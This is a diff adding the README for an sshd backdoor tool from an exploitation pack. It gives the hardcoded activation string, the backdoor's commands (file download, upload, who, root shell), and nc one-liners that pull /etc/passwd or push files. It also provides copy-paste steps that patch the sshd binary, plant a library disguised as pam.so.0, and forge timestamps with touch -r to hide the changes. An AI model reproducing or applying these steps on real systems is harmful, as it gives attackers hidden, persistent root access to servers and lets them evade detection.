@@ -1,0 +1,166 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2014 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_backsshd is a sshd backdoor. d2sec_backsshd (d2sec_infest actually)
+modifies sshd binary and adds a sort of preload library to binary that hooks
+accept().
+
+Use d2sec_backsshd
+--------------------
+
+To activate backdoor, you must connect to backdoored box and to send to the
+string '4ed1479a7a48653b13d492f52ecbe5d6'. After, 5 simple commands are
+available :
+
+d to download
+u to upload
+w to who
+s to shell
+m to mosdef
+
+Examples:
+
+1/ who:
+
+127.0.0.1 22 (ssh) open
+4ed1479a7a48653b13d492f52ecbe5d6
+w
+compaq   tty1         Oct  2 07:45
+compaq   pts/0        Oct  2 07:45 (:0.0)
+
+
+2/ shell:
+
+127.0.0.1 22 (ssh) open
+4ed1479a7a48653b13d492f52ecbe5d6
+s
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+3/ download:
+
+$ (echo '4ed1479a7a48653b13d492f52ecbe5d6'; echo 'd'; echo '/etc/passwd') | nc -vn -p 12345 127.0.0.1 22
+
+4/ upload:
+
+(echo '4ed1479a7a48653b13d492f52ecbe5d6'; echo 'u'; echo '/dev/shm/dest'; cat /dev/shm/src)  | nc -vn -p 12345 127.0.0.1 22
+
+Install d2sec_backsshd
+-----------------------
+
+In order to install d2sec_backsshd, /usr/sbin/sshd for example has to be
+modified and the d2sec_backsshd.so library has to be installed :
+
+# ls -alp /usr/sbin/sshd
+-rwxr-xr-x 1 root root 787096  3 oct.  18:17 /usr/sbin/sshd
+# SSHD_DIR=/usr/sbin/
+# SSHD=apache2
+# cp -i "$SSHD_DIR/$SSHD" "$SSHD"
+# ldd "$SSHD"
+  linux-vdso.so.1 (0x00007fffca577000)
+  libcrypto.so.1.0.0 => /usr/lib/libcrypto.so.1.0.0 (0x00007f509c8c3000)
+  libutil.so.1 => /usr/lib/libutil.so.1 (0x00007f509c6c0000)
+  libz.so.1 => /usr/lib/libz.so.1 (0x00007f509c4aa000)
+  libcrypt.so.1 => /usr/lib/libcrypt.so.1 (0x00007f509c272000)
+  libgssapi_krb5.so.2 => /usr/lib/libgssapi_krb5.so.2 (0x00007f509c026000)
+  libkrb5.so.3 => /usr/lib/libkrb5.so.3 (0x00007f509bd44000)
+  libc.so.6 => /usr/lib/libc.so.6 (0x00007f509b9a1000)
+  libpam.so.0 => /usr/lib/libpam.so.0 (0x00007f509b793000)
+  libdl.so.2 => /usr/lib/libdl.so.2 (0x00007f509b58f000)
+  libk5crypto.so.3 => /usr/lib/libk5crypto.so.3 (0x00007f509b35d000)
+  libcom_err.so.2 => /usr/lib/libcom_err.so.2 (0x00007f509b159000)
+  libkrb5support.so.0 => /usr/lib/libkrb5support.so.0 (0x00007f509af4c000)
+  libkeyutils.so.1 => /usr/lib/libkeyutils.so.1 (0x00007f509ad48000)
+  libresolv.so.2 => /usr/lib/libresolv.so.2 (0x00007f509ab31000)
+  /lib64/ld-linux-x86-64.so.2 (0x00007f509ced8000)
+  libpthread.so.0 => /usr/lib/libpthread.so.0 (0x00007f509a915000)
+# ./d2sec_infest "$SSHD"
+pam.so.0
+# ldd "$SSHD"
+  linux-vdso.so.1 (0x00007fffca577000)
+  pam.so.0 => not found
+  libcrypto.so.1.0.0 => /usr/lib/libcrypto.so.1.0.0 (0x00007f509c8c3000)
+  libutil.so.1 => /usr/lib/libutil.so.1 (0x00007f509c6c0000)
+  libz.so.1 => /usr/lib/libz.so.1 (0x00007f509c4aa000)
+  [...]
+# LIB_DIR=/usr/lib
+# LIB=pam.so.0
+# touch -r "$LIB_DIR" d2sec_sshd.so
+# cp -i d2sec_backsshd.so "$LIB_DIR/$LIB"
+# touch -r d2sec_backsshd.so "$LIB_DIR/$LIB"
+# touch -r d2sec_backsshd.so "$LIB_DIR"
+# ldd "$SSHD"
+  linux-vdso.so.1 (0x00007fffca577000)
+  pam.so.0 => /usr/lib/pam.so.0 (0x00007f509ccd5000)
+  libcrypto.so.1.0.0 => /usr/lib/libcrypto.so.1.0.0 (0x00007f509c8c3000)
+  libutil.so.1 => /usr/lib/libutil.so.1 (0x00007f509c6c0000)
+	[...]
+# ls -l "$LIB_DIR/$LIB"
+[...]
+# cp -ip "$SSHD_DIR/$SSHD" "$SSHD.orig"
+# touch -r "$SSHD_DIR" "$SSHD"
+# rm -f "$SSHD_DIR/$SSHD" && cp -i "$SSHD" "$SSHD_DIR/$SSHD"
+# touch -r "$SSHD.orig" "$SSHD_DIR/$SSHD"
+# touch -r "$SSHD" "$SSHD_DIR"
+# ldd "$SSHD_DIR/$SSHD"
+  linux-vdso.so.1 (0x00007fffca577000)
+  pam.so.0 => /usr/lib/pam.so.0 (0x00007f509ccd5000)
+  libcrypto.so.1.0.0 => /usr/lib/libcrypto.so.1.0.0 (0x00007f509c8c3000)
+  libutil.so.1 => /usr/lib/libutil.so.1 (0x00007f509c6c0000)
+  [...]
+# ls -l "$SSHD_DIR/$SSHD"
+[...]
+
+Now, copy and paste style:
+
+ls -alp /usr/sbin/sshd
+SSHD_DIR=/usr/sbin/
+SSHD=apache2
+cp -i "$SSHD_DIR/$SSHD" "$SSHD"
+ldd "$SSHD"
+./d2sec_infest "$SSHD"
+ldd "$SSHD"
+LIB_DIR=/usr/lib
+LIB=pam.so.0
+touch -r "$LIB_DIR" d2sec_backsshd.so  
+cp -i d2sec_backsshd.so "$LIB_DIR/$LIB"
+touch -r d2sec_backsshd.so "$LIB_DIR/$LIB"
+touch -r d2sec_backsshd.so "$LIB_DIR"
+ldd "$SSHD"
+ls -l "$LIB_DIR/$LIB"
+cp -ip "$SSHD_DIR/$SSHD" "$SSHD.orig"
+touch -r "$SSHD_DIR" "$SSHD"
+rm -f "$SSHD_DIR/$SSHD" && cp -i "$SSHD" "$SSHD_DIR/$SSHD"
+touch -r "$SSHD.orig" "$SSHD_DIR/$SSHD"
+touch -r "$SSHD" "$SSHD_DIR"
+ldd "$SSHD_DIR/$SSHD"
+ls -l "$SSHD_DIR/$SSHD"
+
+Modify d2sec_backsshd
+----------------------
+
+In order to modify the behaviour of d2sec_backsshd, only the d2sec_backsshd library
+has to be reinstalled (copy and paste style, again):
+
+LIB_DIR=/usr/lib
+LIB=pam.so.0
+gcc -Wall -Werror -s -shared -fPIC -fno-stack-protector -o preload.so preload.c -ldl
+touch -r "$LIB_DIR" d2sec_backsshd.so
+rm -f "$LIB_DIR/$LIB" && cp -i your_d2sec_backsshd.so "$LIB_DIR/$LIB"
+touch -r your_d2sec_backsshd.so "$LIB_DIR/$LIB"
+touch -r your_d2sec_backsshd.so "$LIB_DIR"
+
+EOF
